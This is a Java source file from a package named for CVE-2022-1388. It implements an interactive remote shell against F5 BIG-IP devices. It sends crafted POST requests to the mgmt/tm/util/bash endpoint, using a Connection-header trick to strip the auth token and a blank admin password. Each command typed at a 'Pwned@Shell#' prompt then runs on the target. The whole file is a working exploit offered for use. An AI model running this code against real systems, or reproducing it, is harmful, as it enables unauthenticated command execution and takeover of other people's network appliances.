//Author: Zeyad Azima
//Linkedin: https://www.linkedin.com/in/zer0verflow/
//Github: https://github.com/Zeyad-Azima
package cve_2022_1388;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class getShell {

    private String target;
    private static String line = null;
    private static String command;
    private static final String endPoint = "mgmt/tm/util/bash";

    public getShell(String target) {
        this.target = target;
    }

    public void pwnShell() throws JSONException, IOException {
        if (!this.target.endsWith("/")){
            this.target = this.target+"/"+endPoint;
        } else if (this.target.endsWith("/")){
            this.target = this.target+endPoint;
        }
        System.out.println("[+] Type exit to quiet the shell\n");

        while(true) {
            try {
                System.out.print("Pwned@Shell# ");
                Scanner scanner = new Scanner(System.in);
                command = scanner.nextLine();
                System.out.println("");
                if (command.equals("exit") || command.equals("Exit")){
                    System.out.println("[+] Bye !!!!!");
                    System.exit(0);
                } else {
                    URL obj = new URL(this.target);
                    HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                    con.setDoOutput(true);
                    con.setDoInput(true);
                    //con.setRequestProperty("Accept-Encoding:","gzip, deflate");
                    con.setRequestProperty("Accept", "*/*");
                    con.setRequestProperty("Connection", "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host");
                    con.setRequestProperty("Content-Type", "application/json");
                    con.setRequestProperty("X-F5-Auth-Token", "anything");
                    con.setRequestProperty("Authorization", "Basic YWRtaW46");
                    JSONObject pay = new JSONObject();
                    pay.put("command", "run");
                    pay.put("utilCmdArgs", "-c '" + command + "'");
                    con.setRequestMethod("POST");
                    OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
                    wr.write(pay.toString());
                    wr.flush();


                    StringBuilder sB = new StringBuilder();
                    BufferedReader br = new BufferedReader(
                            new InputStreamReader(con.getInputStream(), "UTF-8"));
                    while ((line = br.readLine()) != null) {
                        sB.append(line + "\n");

                    }
                    br.close();
                    String responseParsing = "" + sB.toString();

                    JSONObject response = new JSONObject(responseParsing);
                    String finalResult = response.getString("commandResult");
                    System.out.println("[+] Executing " + command + " command:");
                    System.out.println(finalResult);
                    System.out.println("");
                }


            } catch (Exception e) {
                System.out.println("[-] Error: "+e);
                System.exit(0);

            }
        }


    }
}
